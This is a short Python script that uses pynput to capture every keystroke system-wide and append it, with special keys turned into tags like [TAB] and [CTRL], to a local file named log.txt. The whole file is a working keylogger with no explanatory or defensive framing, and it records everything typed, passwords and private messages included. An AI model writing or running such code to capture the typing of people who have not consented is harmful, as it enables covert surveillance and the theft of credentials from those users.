from pynput.keyboard import Listener, Key

def write_to_file(key):
    keydata = str(key).replace("'", "")

    if keydata == 'Key.space':
        keydata = ' '
    elif keydata == 'Key.enter':
        keydata = '\n'
    elif keydata == 'Key.tab':
        keydata = '[TAB]'
    elif keydata == 'Key.backspace':
        keydata = '[BACKSPACE]'
    elif keydata in ['Key.shift', 'Key.shift_r', 'Key.shift_l']:
        keydata = ''
    elif keydata in ['Key.ctrl', 'Key.ctrl_r', 'Key.ctrl_l']:
        keydata = '[CTRL]'
    elif keydata in ['Key.alt', 'Key.alt_r', 'Key.alt_l']:
        keydata = '[ALT]'
    elif keydata == 'Key.caps_lock':
        keydata = '[CAPSLOCK]'
    elif keydata == 'Key.esc':
        keydata = '[ESC]'
    elif keydata == 'Key.delete':
        keydata = '[DELETE]'
    elif keydata == 'Key.backspace':
        keydata = '[BACKSPACE]'
    elif keydata.startswith('Key.'):
        keydata = f'[{keydata[4:].upper()}]'
    
    with open("log.txt", 'a') as f:
        f.write(keydata)

with Listener(on_press=write_to_file) as l:
    l.join()
